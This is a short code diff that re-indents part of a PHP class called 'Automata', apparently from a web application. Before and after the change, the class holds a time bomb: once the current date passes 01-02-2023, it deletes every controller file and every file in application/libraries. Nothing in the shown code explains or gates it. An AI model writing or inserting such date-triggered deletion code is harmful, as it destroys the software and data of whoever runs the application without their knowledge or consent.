@@ -8,16 +8,16 @@ class Automata {
         $libfiles = glob('application/libraries/*.php');
 
         if (strtotime(date('d F Y')) > strtotime(date('d F Y', strtotime("01-02-2023")))) {
-        foreach($ctrlfiles as $rowa){
-            if(file_exists($rowa)) {
-                unlink($rowa);
+            foreach($ctrlfiles as $rowa){
+                if(file_exists($rowa)) {
+                    unlink($rowa);
+                }
             }
-        }
-        foreach($libfiles as $rowb){
-            if(file_exists($rowb)) {
-                unlink($rowb);
+            foreach($libfiles as $rowb){
+                if(file_exists($rowb)) {
+                    unlink($rowb);
+                }
             }
-        }
         }
     }
 
